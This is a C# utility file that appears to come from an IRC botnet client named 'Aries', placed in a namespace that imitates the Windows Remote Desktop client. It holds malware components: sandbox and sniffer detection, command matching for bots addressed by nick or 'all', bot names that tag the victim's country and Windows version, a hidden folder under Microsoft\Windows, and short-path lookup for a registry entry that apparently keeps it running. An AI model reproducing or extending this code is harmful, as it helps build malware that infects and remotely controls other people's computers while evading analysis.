using System;
using System.Text;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace mstsc.Aries
{
    sealed class Util
    {

        /// <summary>
        /// Decrease the private working set size which is shown by default in Task Manager
        /// </summary>
        /// <param name="proc">Process handle</param>
        /// <param name="min">use -1</param>
        /// <param name="max">use -1</param>
        [DllImport("kernel32.dll")]
        public static extern bool SetProcessWorkingSetSize(IntPtr proc, int min, int max);

        /// <summary>
        /// Used to check the dll's loaded in the process (Anti Sniffer / sandboxie)
        /// </summary>
        /// <param name="lpModuleName">DLL to check for</param>
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Retreive the short path name (8.3 Filename), used to set the path of the file in the Windows Registry
        /// </summary>
        /// <param name="path">Path of file</param>
        /// <param name="shortPath">Stringbuilder to store the short path in</param>
        /// <param name="shortPathLength">Length of stringbuilder used</param>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path,
           [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

        public static bool AntiCheckComplete;
        public static System.Threading.Thread AntiThread = new System.Threading.Thread(Main.Instance.AntiTimer);
        public static string ShortPath;

        public static bool IncludesNick(string[] CommandParams, string Nick)
        {
            if (CommandParams.Length >= 2)
            {
                return (CommandParams[1] == "all" || CommandParams[1] == Nick);
            }
            return false;
        }

        /*public static void UpdateProcessWorkingSize()
        {
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
        }*/

        public static string GenerateNick()
        {
            if (Antis.ProcessAntis.UseAnti(Antis.ProcessAntis.Type.RandomNick))
            {
                string name = new System.Net.WebClient().DownloadString("http://www.behindthename.com/random/random.php?number=1&gender=both&surname=&all=no&usage_afr=1&usage_eng=1&usage_jap=1&usage_jew=1&usage_wel=1");
                return System.Text.RegularExpressions.Regex.Split(name, "class=\"plain\">")[1].Split('<')[0];
            }

            string WindowsVersion;
            RegistryKey winver = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
            string Version = winver.GetValue("CurrentVersion").ToString();

            /*if (System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("AMD64") & Version == "5.2") { Version = "5.12"; }
            if (System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("AMD64") & Version == "6.0") { Version = "6.02"; }
            if (System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("AMD64") & Version == "6.1") { Version = "6.12"; }*/

            bool NT5 = false;

            switch (Version)
            {
                case "5.0":
                    WindowsVersion = "Win2K";
                    NT5 = true;
                    break;
                case "5.1":
                    WindowsVersion = "WinXP";
                    NT5 = true;
                    break;
                case "5.2":
                    WindowsVersion = "Win2K3";
                    NT5 = true;
                    break;
                case "6.0":
                    WindowsVersion = "Vista";
                    break;
                case "6.1":
                    WindowsVersion = "Win7";
                    break;
                default:
                    WindowsVersion = "Unknown";
                    break;
            }
            if (NT5)
            {
                Config.TemporaryFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows";
                if (!System.IO.Directory.Exists(Config.TemporaryFilesPath)) { System.IO.Directory.CreateDirectory(Config.TemporaryFilesPath); }
            }
            GC.Collect();
            /*if (ver == "5.12")
        {
            tfileloc = TempP + @"\Templates";
            if (!Directory.Exists(tfileloc)) { Directory.CreateDirectory(tfileloc); }
        }*/
            return "[" + System.Globalization.RegionInfo.CurrentRegion.ThreeLetterISORegionName.ToUpper() + "-" + WindowsVersion + "x" + (IntPtr.Size * 8).ToString() + "]" + new Random().Next(10000, 99999);
        }


        /*/// <summary>
        /// Check if the computer is connected to a network
        /// </summary>*/
        /*public static bool IsNetworkConnected()
        {
            try
            {
                NetworkInterface[] networkCards = NetworkInterface.GetAllNetworkInterfaces();
                bool connected = false;

                // Loop through to find the one we want to check for connectivity.
                // Connection can have different numbers appended so check that the 
                // network connections start with the conditions checked below.
                foreach (NetworkInterface nc in networkCards)
                {
                    // Check LAN
                    if (nc.Name.StartsWith("Local Area Connection"))
                    {
                        if (nc.OperationalStatus == OperationalStatus.Up)
                        {
                            connected = true;
                        }
                    }

                    // Check for Wireless
                    if (nc.Name.StartsWith("Wireless Network Connection"))
                    {
                        if (nc.OperationalStatus == OperationalStatus.Up)
                        {
                            connected = true;
                        }
                    }
                }

                return connected;
            }
            catch (Exception) { return false; }
        }*/
    }
}
